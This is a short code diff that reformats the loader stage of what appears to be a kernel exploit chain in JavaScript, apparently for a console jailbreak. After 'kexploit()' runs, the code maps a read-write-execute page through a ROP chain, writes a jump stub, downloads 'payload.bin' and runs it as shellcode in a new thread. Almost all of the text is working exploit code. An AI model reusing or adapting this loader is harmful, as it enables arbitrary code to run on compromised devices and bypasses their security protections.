@@ -1821,19 +1821,9 @@ function array_from_address(addr, size) {
 
 kexploit().then(() => {
 
-var loader_addr = chain.sysp(
-  'mmap',
-  new Int(0, 0),                         
-  0x1000,                               
-  PROT_READ | PROT_WRITE | PROT_EXEC,    
-  0x41000,                              
-  -1,
-  0
-);
-
+ var loader_addr = chain.sysp('mmap', new Int(0, 0), 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, 0x41000, -1, 0);
  var tmpStubArray = array_from_address(loader_addr, 1);
  tmpStubArray[0] = 0x00C3E7FF;
-
  var req = new XMLHttpRequest();
  req.responseType = "arraybuffer";
  req.open('GET','payload.bin');
@@ -1850,15 +1840,8 @@ var loader_addr = chain.sysp(
    var shellcode = new Uint32Array(tmp.buffer);
    pl.set(shellcode,0);
    var pthread = malloc(0x10);
-   
-    call_nze(
-        'pthread_create',
-        pthread,
-        0,
-        loader_addr,
-        payload_buffer,
-    );
-    allset();
+   call_nze('pthread_create', pthread, 0, loader_addr, payload_buffer);
+   allset();
    }
  };
 
